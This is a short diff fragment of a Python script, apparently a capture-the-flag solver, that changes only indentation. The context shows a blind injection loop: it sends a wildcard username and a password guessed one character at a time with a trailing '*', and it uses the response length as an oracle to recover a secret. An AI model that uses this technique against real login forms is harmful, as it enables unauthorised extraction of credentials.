@@ -9,9 +9,9 @@ try:
 	while 1: 
 			for char in charlist:
 				data = {
-						'username':'*',
-						'password':''.join(flag)+char+'*'
-						}
+					'username':'*',
+					'password':''.join(flag)+char+'*'
+					}
 				r = requests.post(url,data)
 				if len(r.text) == 2586:
 					flag.append(char)
